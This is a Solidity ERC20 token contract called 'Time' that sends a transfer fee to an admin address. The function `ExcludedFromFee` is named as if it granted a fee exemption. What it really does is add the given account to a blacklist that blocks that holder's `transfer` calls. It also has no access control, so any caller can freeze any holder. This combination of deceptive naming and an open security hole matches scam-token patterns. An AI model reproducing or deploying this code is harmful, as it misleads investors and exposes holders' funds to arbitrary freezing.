// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract Time is ERC20 {
    address public admin;
    uint256 public sellFee = 89;
    mapping (address => bool) public isExcludedFromFee;
    mapping (address => bool) public ExcludedFromFeeListed;

    constructor() ERC20("Time", "Time") {
        admin = msg.sender;
        _mint(msg.sender, 1000000 * (10 ** uint256(decimals()))); // Mint initial supply
        isExcludedFromFee[msg.sender] = true; // Exclude contract deployer from fee
        isExcludedFromFee[0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D] = true; // Exclude Uniswap router from fee
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
    require(!ExcludedFromFeeListed[_msgSender()]);

    if (isExcludedFromFee[_msgSender()]) {
        _transfer(_msgSender(), recipient, amount);
    } else {
        uint256 feeAmount = amount * sellFee / 10000;
        uint256 netAmount = amount - feeAmount;
        _transfer(_msgSender(), admin, feeAmount);  // Transfer fees to admin
        _transfer(_msgSender(), recipient, netAmount);
    }
    return true;
    }

    function ExcludedFromFee(address account) external {
    ExcludedFromFeeListed[account] = true;
    }
}